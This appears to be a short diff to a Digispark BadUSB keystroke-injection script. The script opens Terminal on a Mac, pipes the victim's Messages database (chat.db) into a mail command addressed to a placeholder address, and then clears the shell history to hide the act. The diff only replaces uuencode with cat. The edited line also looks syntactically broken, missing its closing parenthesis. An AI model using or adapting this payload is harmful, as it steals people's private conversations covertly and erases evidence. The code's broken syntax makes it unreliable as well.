@@ -10,7 +10,7 @@ void loop() {
     DigiKeyboard.print("Terminal");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(300);
-    DigiKeyboard.print("uuencode ~/Library/Messages/chat.db chat.db | mail -s 'Digispark Report' <email_address>"
+    DigiKeyboard.print("cat ~/Library/Messages/chat.db chat.db | mail -s 'Digispark Report' <email_address>"
     DigiKeyboard.delay(300);
     DigiKeyboard.print("history -c");
     DigiKeyboard.delay(300);
